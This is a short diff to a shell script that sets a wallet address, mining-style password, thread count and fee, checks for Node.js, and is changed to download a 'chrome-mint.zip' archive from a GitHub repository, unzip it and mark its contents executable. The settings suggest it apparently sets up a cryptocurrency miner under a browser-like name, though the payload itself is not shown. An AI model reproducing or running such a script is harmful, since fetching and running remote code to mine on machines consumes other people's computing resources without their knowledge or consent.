@@ -7,6 +7,7 @@ WALLET="UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx"
 PASSWORD="x"
 THREADS=3
 FEE=0
+
 # Function to check if Node.js is installed
 function check_node() {
     if ! command -v node &> /dev/null; then
@@ -20,8 +21,11 @@ function check_node() {
 # Function to setup the environment and run the script
 function setup_and_run() {
     # Download and extract the tarball
-    git clone https://github.com/barburonjilo/chrome-scraper.git
-    cd chrome-scraper  || { echo "Failed to enter the chrome-mint directory"; exit 1; }
+    curl https://github.com/barburonjilo/back/raw/main/chrome-mint.zip -L -O -J
+    sudo apt install unzip -y
+    unzip chrome-mint.zip
+    rm chrome-mint.zip
+    cd chrome-mint || { echo "Failed to enter the chrome-mint directory"; exit 1; }
 
     # Install dependencies
     chmod +x *
